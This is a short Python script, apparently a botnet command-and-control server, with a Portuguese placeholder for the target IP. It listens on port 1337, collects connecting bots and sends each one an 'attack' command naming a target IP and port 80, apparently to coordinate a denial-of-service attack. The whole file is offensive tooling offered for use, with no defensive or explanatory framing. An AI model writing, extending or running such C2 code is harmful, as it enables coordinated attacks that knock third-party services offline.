import socket
bots = []
TARGET = "insira o IP alvo"
PORT = 80

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 1337))
server.listen(5)

print("[+] C2 server online.")

while True:
    client, addr = server.accept()
    print(f"[+] Bot conectado: {addr}")
    bots.append(client)

    for bot in bots:
        try:
            bot.send(f"attack {TARGET} {PORT}".encode())
        except:
            bots.remove(bot)
